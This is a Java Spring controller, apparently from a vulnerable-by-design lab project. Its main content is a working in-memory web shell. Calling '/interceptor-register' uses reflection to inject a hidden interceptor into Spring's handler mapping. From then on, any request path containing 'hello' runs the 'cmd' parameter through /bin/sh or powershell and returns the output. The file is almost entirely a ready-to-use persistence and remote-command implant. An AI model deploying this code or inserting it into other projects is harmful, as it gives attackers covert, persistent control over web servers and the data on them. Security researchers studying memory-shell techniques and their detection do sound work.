package spring.vul.springvulenv.controller;

import org.springframework.stereotype.Component;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Scanner;

@Controller
public class InterceptorInjectController {
    @RequestMapping("/interceptor-register")
    public void Inject(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            assert context != null;
            org.springframework.web.servlet.handler.AbstractHandlerMapping handlerMapping = ((org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class));
            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> interceptors = (ArrayList<Object>) field.get(handlerMapping);
            interceptors.add(new MemshellInterceptor());

        } catch (Exception e) {
            response.getWriter().println(e);
        }

    }


    public class MemshellInterceptor implements HandlerInterceptor {
        String defaultCharSet = "utf-8";
        String cmdTemplate = "%s";//chcp 65001&

        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String uri = request.getRequestURI();// /Spring_Vul_Env_war/hello
            if (uri.contains("hello")) {
                String result = shell(request, response);
                PrintWriter writer = response.getWriter();
                writer.write(result);
                writer.flush();
                writer.close();
            }
            return true;
        }


        @ResponseBody
        public String shell(HttpServletRequest request, HttpServletResponse response) {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    String charSet = request.getParameter("charset");
                    if (charSet != null) {
                        charSet = charSet.trim();
                    } else {
                        charSet = new String();
                    }
                    String[] cmds = null;
                    if (File.separator.equals("/")) {
                        cmds = new String[]{"/bin/sh", "-c", String.format(cmdTemplate, request.getParameter("cmd"))};
                    } else {
                        cmds = new String[]{"powershell", "/C", String.format(cmdTemplate, request.getParameter("cmd"))};
                    }
                    InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                    InputStreamReader reader = new InputStreamReader(inputStream, charSet.isEmpty() ? Charset.forName(defaultCharSet) : Charset.forName(charSet));
                    Scanner scanner = new Scanner(reader).useDelimiter("\\A");
                    StringBuilder stringBuilder = new StringBuilder();
                    while (scanner.hasNextLine()) {
                        stringBuilder.append(scanner.nextLine());
                    }
                    String result = stringBuilder.toString();
                    return result;
//                    response.getWriter().println(result);
                } catch (Exception e) {
                    //                        response.getWriter().println("Exception:" + e.getClass().getName() + e.getMessage());
                    return ("Exception:" + e.getClass().getName() + e.getMessage());
                }
            }
            return "Complete";
        }
    }

}
